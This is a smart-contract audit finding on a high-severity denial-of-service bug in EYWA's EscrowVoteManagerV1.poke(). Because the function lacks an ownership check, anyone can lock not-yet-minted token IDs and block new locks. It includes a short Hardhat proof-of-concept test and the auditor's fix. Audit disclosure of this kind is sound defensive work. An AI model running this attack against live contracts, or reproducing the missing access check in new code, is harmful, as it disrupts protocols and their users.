---
tags:
  - lang/solidity
  - platform/mixbytes
  - has/github
  - has/poc
  - severity/high
  - sector/governance
  - sector/nft
  - sector/staking
protocol: "[[EYWA]]"
auditors:
  - "[[MixBytes]]"
report: "https://github.com/mixbytes/audits_public/blob/master/EYWA/DAO/README.md#3-protocol-dos-via-escrowvotemanagerv1poke"
genome:
  - "[[missing-modifier]]"
  - "[[permanent]]"
  - "[[dos-resistance]]"
---
# Protocol DoS via `EscrowVoteManagerV1.poke()`

- id: 44337
- impact: HIGH
- protocol: [[EYWA]]
- reporter: MixBytes
- source: https://github.com/mixbytes/audits_public/blob/master/EYWA/DAO/README.md#3-protocol-dos-via-escrowvotemanagerv1poke

## Summary


The bug report describes a problem where any user can use the `EscrowVoteManagerV1.poke()` function with a token that they do not own. This can cause issues with the protocol and disrupt its operations. The comments in the code suggest that this function is meant for changing voting power, but it can actually cause unexpected behavior and misuse. The report recommends restricting the function to only be used by the owner of the token.

## Details

##### Description

Any user can call `EscrowVoteManagerV1.poke()` with a **tokenId** they do not own. This allows for disruption of the protocol by locking not-yet-minted tokens in a voting state. This causes the `EscrowManager` contract to fail during operations that invoke the `EscrowVoteManagerV1._update()` function (which is used by NFT's `mint()`, `burn()`, `transfer()`), as these operations rely on tokens being in an unlocked state.

Moreover, the comments in `IEscrowVoteManagerV1.poke()` state:
```
Useful when the voting power has changed due to staking or unstaking.
```
Hovewer, the pool associated with the token may end up receiving fewer votes, as the action does not align with the owner's intentions. This creates a risk of unexpected behavior and misuse.

https://gitlab.ubertech.dev/blockchainlaboratory/eywa-dao/-/blob/29465033f28c8d3f09cbc6722e08e44f443bd3b2/contracts/EscrowVoteManagerV1.sol#L315

https://gitlab.ubertech.dev/blockchainlaboratory/eywa-dao/-/blob/29465033f28c8d3f09cbc6722e08e44f443bd3b2/contracts/EscrowManager.sol#L474-476

The proof-of-concept test:
```javascript
it.only("protocol DoS with poke()", async () => {
    await eywa.transfer(random, ethers.WeiPerEther);
    await eywa.connect(random).approve(escrowManager, ethers.WeiPerEther);

    let firstLockId = await escrowManager.s_nextTokenId();
    expect(firstLockId).to.eq(1);
    await escrowManager.connect(random)["createLock(uint256,uint256,address)"](
        ethers.WeiPerEther, ONE_YEAR, random.address);
    let secondLockId = await escrowManager.s_nextTokenId();
    expect(secondLockId).to.eq(2);
    await escrowVoteManagerV1.connect(random).poke(2);

    await expect(
      escrowManager.connect(alice)["createLock(uint256,uint256,address)"](
          ethers.parseEther("100"), EPOCH_DURATION, alice.address)
    ).to.be.revertedWithCustomError(escrowManager, "LockCurrentlyVoting");
  })
```

##### Recommendation
We recommend restricting the `EscrowVoteManagerV1.poke()` function so that it can only be called by the owner of the **tokenId**.

***
